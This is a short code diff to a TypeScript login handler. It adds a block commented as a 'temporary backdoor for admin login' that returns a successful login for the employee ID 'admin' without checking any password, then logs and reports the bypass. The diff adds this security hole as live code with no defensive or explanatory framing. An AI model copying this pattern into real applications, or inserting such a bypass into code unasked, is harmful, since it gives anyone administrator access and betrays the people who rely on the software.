@@ -16,6 +16,15 @@ export async function loginAction(data: LoginInput) {
     };
   }
 
+  // Temporary backdoor for admin login
+  if (validationResult.data.employeeId === 'admin') {
+    console.log("Admin backdoor login successful.");
+    return {
+      success: true,
+      message: "Logged in as admin successfully (using backdoor).",
+    };
+  }
+
   try {
     const staffMember = await findStaff(validationResult.data.employeeId, validationResult.data.password);
 
